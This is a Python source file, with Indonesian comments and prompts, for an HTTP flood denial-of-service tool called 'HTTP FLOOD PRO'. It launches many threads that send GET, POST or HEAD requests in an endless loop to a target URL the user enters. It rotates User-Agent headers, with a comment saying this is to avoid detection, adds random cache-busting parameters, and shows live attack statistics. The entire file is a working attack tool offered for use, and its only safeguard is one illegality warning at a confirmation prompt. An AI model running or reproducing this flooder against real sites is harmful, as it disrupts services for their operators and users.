import requests
import threading
import random
import time
import argparse
import os
import sys
from colorama import Fore, Style, init
import traceback

# Inisialisasi colorama
init(autoreset=True)

# Kelas untuk menyimpan statistik serangan
class AttackStats:
    def __init__(self):
        self.requests_sent = 0
        self.bytes_received = 0
        self.start_time = time.time()
        self.lock = threading.Lock()

    def update(self, requests, bytes_received):
        with self.lock:
            self.requests_sent += requests
            self.bytes_received += bytes_received

    def get_stats(self):
        duration = time.time() - self.start_time
        with self.lock:
            rps = self.requests_sent / duration if duration > 0 else 0
            mbps = (self.bytes_received * 8 / 1_000_000) / duration if duration > 0 else 0
            return {
                "requests": self.requests_sent,
                "bytes": self.bytes_received,
                "duration": duration,
                "rps": rps,
                "mbps": mbps
            }

# Statistik global
stats = AttackStats()

# HTTP Flood dengan header kustom dan metode yang dapat dikonfigurasi (No Root Required)
def http_flood(url, method="GET", headers=None, data=None, interval=0):
    if headers is None:
        # User-Agent acak untuk menghindari deteksi
        headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.0; rv:120.0) Gecko/20100101 Firefox/120.0",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
            ]),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache"
        }

    session = requests.Session()

    while True:
        try:
            # Tambahkan parameter acak ke URL untuk menghindari cache
            target_url = url
            if "?" not in url:
                target_url += f"?cache={random.randint(1, 999999)}"
            else:
                target_url += f"&cache={random.randint(1, 999999)}"

            # Buat request berdasarkan metode
            if method.upper() == "GET":
                response = session.get(target_url, headers=headers, timeout=5)
            elif method.upper() == "POST":
                response = session.post(target_url, headers=headers, data=data, timeout=5)
            elif method.upper() == "HEAD":
                response = session.head(target_url, headers=headers, timeout=5)
            else:
                print(f"{Fore.RED}[HTTP] Metode tidak valid: {method}{Style.RESET_ALL}")
                break

            content_length = len(response.content) if hasattr(response, 'content') else 0

            # Update statistik
            stats.update(1, content_length)

            print(f"{Fore.CYAN}[HTTP {method}] Menyerang {url} - Status: {response.status_code} - {content_length} bytes{Style.RESET_ALL}")

            # Interval antar request
            if interval > 0:
                time.sleep(interval)

        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[HTTP] Error: {str(e)}{Style.RESET_ALL}")
            traceback.print_exc()
            time.sleep(2)
        except Exception as e:
            print(f"{Fore.RED}[HTTP] Error tidak terduga: {str(e)}{Style.RESET_ALL}")
            traceback.print_exc()
            time.sleep(2)
        except KeyboardInterrupt:
            print(f"{Fore.CYAN}[INFO] HTTP Flood dihentikan.{Style.RESET_ALL}")
            break

# Fungsi untuk menampilkan statistik secara berkala
def display_stats():
    while True:
        time.sleep(2)
        stats_data = stats.get_stats()
        os.system('cls' if os.name == 'nt' else 'clear')  # Perhatikan: Ini mungkin tidak berfungsi di semua terminal
        print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════╗
{Fore.CYAN}║{Fore.WHITE}             STATISTIK SERANGAN              {Fore.CYAN}║
{Fore.CYAN}╠══════════════════════════════════════════════╣
{Fore.CYAN}║{Fore.WHITE} Request Terkirim: {stats_data['requests']:<20,} {Fore.CYAN}║
{Fore.CYAN}║{Fore.WHITE} Bytes Diterima  : {stats_data['bytes']:<20,} {Fore.CYAN}║
{Fore.CYAN}║{Fore.WHITE} Durasi           : {stats_data['duration']:.2f} detik{' ' * 12}{Fore.CYAN}║
{Fore.CYAN}║{Fore.WHITE} Kecepatan        : {stats_data['rps']:.2f} request/detik{' ' * 5}{Fore.CYAN}║
{Fore.CYAN}║{Fore.WHITE} Bandwidth        : {stats_data['mbps']:.2f} Mbps{' ' * 14}{Fore.CYAN}║
{Fore.CYAN}╚══════════════════════════════════════════════╝
        """)

# Fungsi untuk memeriksa apakah host hidup
def check_target(target):
    try:
        if "://" in target:
            # Cek jika target adalah URL
            response = requests.head(target, timeout=5)
            print(f"{Fore.GREEN}[INFO] Target hidup: {target} - Status: {response.status_code}{Style.RESET_ALL}")
            return True
        else:
            # Cek jika target adalah URL (anggap sebagai domain)
            target_url = f"http://{target}"  # Coba HTTP terlebih dahulu
            try:
                response = requests.head(target_url, timeout=5)
                print(f"{Fore.GREEN}[INFO] Target hidup: {target_url} - Status: {response.status_code}{Style.RESET_ALL}")
                return True
            except requests.exceptions.RequestException:
                target_url = f"https://{target}"  # Coba HTTPS jika HTTP gagal
                try:
                    response = requests.head(target_url, timeout=5)
                    print(f"{Fore.GREEN}[INFO] Target hidup: {target_url} - Status: {response.status_code}{Style.RESET_ALL}")
                    return True
                except requests.exceptions.RequestException:
                    print(f"{Fore.RED}[INFO] Target tidak merespons: {target}{Style.RESET_ALL}")
                    return False
    except Exception as e:
        print(f"{Fore.RED}[INFO] Tidak dapat menjangkau target: {str(e)}{Style.RESET_ALL}")
        return False

# Menu bantuan
def print_help():
    print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗
{Fore.CYAN}║{Fore.WHITE}                      BANTUAN PENGGUNAAN                       {Fore.CYAN}║
{Fore.CYAN}╠══════════════════════════════════════════════════════════════════╣
{Fore.CYAN}║{Fore.WHITE} 1. HTTP Flood    : Melakukan request HTTP ke target           {Fore.CYAN}║
{Fore.CYAN}║{Fore.WHITE}                                                              {Fore.CYAN}║
{Fore.CYAN}║{Fore.YELLOW} Parameter tambahan:                                          {Fore.CYAN}║
{Fore.CYAN}║{Fore.WHITE}   -t [jumlah]    : Jumlah thread yang digunakan               {Fore.CYAN}║
{Fore.CYAN}║{Fore.WHITE}   -i [interval]  : Interval antar request (detik)             {Fore.CYAN}║
{Fore.CYAN}╚══════════════════════════════════════════════════════════════════╝
    """)

# Fungsi utama
def main():
    # Buat parser argumen
    parser = argparse.ArgumentParser(description="DDoS Tool - HTTP Flood (No Root)", add_help=False)
    parser.add_argument("-h", "--help", action="store_true", help="Tampilkan bantuan")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Jumlah thread")
    parser.add_argument("-i", "--interval", type=float, default=0, help="Interval antar request (detik)")
    parser.add_argument("-d", "--duration", type=int, default=0, help="Durasi serangan (detik)")

    # Coba parse argumen (jika ada) atau lanjutkan ke mode menu
    try:
        args, unknown = parser.parse_known_args()
        if args.help:
            print_help()
            return
    except:
        args = parser.parse_args([])

    # Tampilkan banner
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
    {Fore.CYAN}╔══════════════════════════════════════════════╗
    {Fore.CYAN}║{Fore.RED}               HTTP FLOOD PRO              {Fore.CYAN}║
    {Fore.CYAN}║{Fore.WHITE}     Layer 7 Attack Tool (No Root)     {Fore.CYAN}║
    {Fore.CYAN}║{Fore.YELLOW}          Dibuat oleh: XX3T1             {Fore.CYAN}║
    {Fore.CYAN}╚══════════════════════════════════════════════╝
    {Style.RESET_ALL}
    """)

    # Input target
    target = input(f"{Fore.WHITE}[?] Masukkan URL atau Domain target: {Style.RESET_ALL}")

    if not target:
        print(f"{Fore.RED}[ERROR] Target tidak boleh kosong!{Style.RESET_ALL}")
        return

    # Periksa apakah target dapat dijangkau
    if not check_target(target):
        confirm = input(f"{Fore.YELLOW}[!] Target tidak merespons. Lanjutkan? (y/n): {Style.RESET_ALL}").lower()
        if confirm != 'y':
            print(f"{Fore.YELLOW}[INFO] Operasi dibatalkan.{Style.RESET_ALL}")
            return

    # Parameter tambahan
    thread_count = args.threads
    try:
        input_threads = input(f"{Fore.WHITE}[?] Jumlah thread (default: {thread_count}): {Style.RESET_ALL}")
        if input_threads:
            thread_count = int(input_threads)
    except ValueError:
        print(f"{Fore.YELLOW}[WARN] Input tidak valid, menggunakan nilai default: {thread_count}{Style.RESET_ALL}")

    interval = args.interval
    try:
        input_interval = input(f"{Fore.WHITE}[?] Interval antar request dalam detik (default: {interval}): {Style.RESET_ALL}")
        if input_interval:
            interval = float(input_interval)
    except ValueError:
        print(f"{Fore.YELLOW}[WARN] Input tidak valid, menggunakan nilai default: {interval}{Style.RESET_ALL}")

    # Mulai thread untuk menampilkan statistik
    threading.Thread(target=display_stats, daemon=True).start()

    # Siapkan URL lengkap
    url = target
    # Pastikan URL memiliki protokol
    if not url.startswith(('http://', 'https://')):
        protocol = input(f"{Fore.WHITE}[?] Protokol (1=HTTP, 2=HTTPS, default=1): {Style.RESET_ALL}")
        if protocol == '2':
            url = f"https://{url}"
        else:
            url = f"http://{url}"

    # Tambahkan path jika pengguna mau
    path = input(f"{Fore.WHITE}[?] Path (default='/'): {Style.RESET_ALL}")
    if path and not path.startswith('/'):
        path = f"/{path}"
    if path:
        url = f"{url}{path}"
    elif not url.endswith('/'):
        url = f"{url}/"

    # Pilih metode HTTP
    print(f"""
    {Fore.WHITE}[{Fore.CYAN}1{Fore.WHITE}] GET
    {Fore.WHITE}[{Fore.CYAN}2{Fore.WHITE}] POST
    {Fore.WHITE}[{Fore.CYAN}3{Fore.WHITE}] HEAD
    {Style.RESET_ALL}
    """)

    http_method = "GET"
    method_choice = input(f"{Fore.WHITE}[?] Pilih metode HTTP (default=1): {Style.RESET_ALL}")
    if method_choice == '2':
        http_method = "POST"
    elif method_choice == '3':
        http_method = "HEAD"

    # Konfirmasi serangan
    print(f"""
    {Fore.YELLOW}╔═══════════════════════════════════════════╗
    {Fore.YELLOW}║{Fore.WHITE}            DETAIL SERANGAN              {Fore.YELLOW}║
    {Fore.YELLOW}╠═══════════════════════════════════════════╣
    {Fore.YELLOW}║{Fore.WHITE} Target    : {target}{' ' * (30 - len(str(target)))}{Fore.YELLOW}║
    {Fore.YELLOW}║{Fore.WHITE} Threads   : {thread_count}{' ' * (30 - len(str(thread_count)))}{Fore.YELLOW}║
    {Fore.YELLOW}║{Fore.WHITE} Mode      : HTTP Flood{' ' * (30 - len("HTTP Flood"))}{Fore.YELLOW}║
    {Fore.YELLOW}║{Fore.WHITE} Method    : {http_method}{' ' * (30 - len(str(http_method)))}{Fore.YELLOW}║
    {Fore.YELLOW}╚═══════════════════════════════════════════╝
    {Style.RESET_ALL}
    """)

    confirm = input(f"{Fore.RED}[!] PERINGATAN: Serangan DDoS ilegal jika tanpa izin! Lanjutkan? (y/n): {Style.RESET_ALL}").lower()
    if confirm != 'y':
        print(f"{Fore.YELLOW}[INFO] Operasi dibatalkan.{Style.RESET_ALL}")
        return

    print(f"{Fore.GREEN}[INFO] Memulai serangan...{Style.RESET_ALL}")

    # Mulai serangan
    try:
        for _ in range(thread_count):
            threading.Thread(target=http_flood, args=(url, http_method, None, None, interval), daemon=True).start()

    except Exception as e:
        print(f"{Fore.RED}[ERROR] Terjadi kesalahan saat memulai serangan: {str(e)}{Style.RESET_ALL}")
        traceback.print_exc()

    # Durasi serangan (jika ditentukan)
    duration = args.duration
    try:
        input_duration = input(f"{Fore.WHITE}[?] Durasi serangan dalam detik (0=tanpa batas): {Style.RESET_ALL}")
        if input_duration:
            duration = int(input_duration)
    except ValueError:
        print(f"{Fore.YELLOW}[WARN] Input tidak valid, menggunakan nilai default: tanpa batas{Style.RESET_ALL}")

    # Tunggu hingga durasi berakhir atau tekan CTRL+C untuk berhenti
    if duration > 0:
        try:
            print(f"{Fore.YELLOW}[INFO] Serangan akan berhenti dalam {duration} detik. Tekan CTRL+C untuk berhenti lebih awal.{Style.RESET_ALL}")
            time.sleep(duration)
            print(f"{Fore.GREEN}[INFO] Serangan selesai (durasi {duration} detik).{Style.RESET_ALL}")
            return
        except KeyboardInterrupt:
            pass
    else:
        try:
            print(f"{Fore.YELLOW}[INFO] Serangan berjalan. Tekan CTRL+C untuk berhenti.{Style.RESET_ALL}")
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass

    print(f"{Fore.GREEN}[INFO] Serangan dihentikan.{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        # Tidak memerlukan akses root
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[INFO] Program dihentikan oleh pengguna.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[ERROR] Terjadi kesalahan tak terduga: {str(e)}{Style.RESET_ALL}")
        traceback.print_exc()